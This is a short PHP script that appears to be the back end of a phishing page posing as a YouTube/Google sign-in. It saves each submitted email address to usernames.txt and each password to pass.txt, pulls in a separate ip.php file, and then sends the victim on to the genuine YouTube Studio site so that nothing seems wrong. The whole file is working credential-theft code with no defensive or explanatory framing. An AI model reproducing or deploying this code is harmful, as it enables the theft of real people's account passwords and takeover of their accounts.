<?php
include 'ip.php';
file_put_contents("usernames.txt", "Youtube/Google Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Youtube/Google password : " . $pswrepeat = $_POST['pswrepeat'] . "\n", FILE_APPEND);
header('Location: https://studio.youtube.com/');
?>
